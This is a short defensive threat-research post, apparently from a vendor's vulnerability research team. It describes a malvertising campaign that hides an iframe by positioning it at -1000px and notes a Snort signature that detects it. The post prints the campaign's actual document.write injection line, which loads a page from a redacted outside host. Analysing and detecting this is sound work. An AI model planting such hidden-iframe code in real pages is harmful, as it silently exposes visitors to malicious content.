@@ -1,0 +1,14 @@
+
+As has been well-demonstrated by the Blackhole Exploit Kit's "Loading, Please Wait..." page, people browsing the web are most likely to allow a malicious page to complete whatever action it is attempting to execute when they see no signs of strange activity on that page. Malware authors have taken note of this over the years, and go to great lengths to hide, obscure, or otherwise make invisible any part of a page that might look out of place to even the most casual of observers.
+
+One of the classic techniques for doing so is to make use of hidden HTML iframe tags. As with anything HTML-based, there are an essentially infinite number of ways that the same effect can be achieved; height and width values can be set directly as attributes of the tag, or CSS style properties can be tweaked either inline in the tag itself, or as part of a piece of associated JavaScript.
+
+The VRT has observed a recent malvertising campaign in the wild that puts a new spin on this old idea. Instead of specifiying size values so small that the iframe never renders, the technique being used here abuses the CSS positioning attributes, by specifying absolute values of -1,000 for both the "left" and "top" parameters. As the iframe is declared to be 6x10 pixels in size, the browser considers it to be so far off the edge of the screen that it never even attempts to render it for the user:
+
+
+document.write("<iframe height="10" src="http://<redacted>.org/route.htm" style="left: -1000px; position: absolute; top: -1000px; z-index: 1;" width="6" ></iframe>");
+
+
+
+Fortunately, this particular variant makes for an easy signature, as no legitimate iframes will ever be placed in such a ludicrous spot on the page; SID 23618 will do the job nicely. In the meantime, the VRT is continuing to follow new developments in iframe obfuscation, with an eye towards generically detecting malicious hidden iframes. As always, if you see something malicious on your network that we're not currently providing coverage for, please send us a sample at vrt at sourcefire dot com, so that our detection can be improved for you and for the entire Snort user base.
+
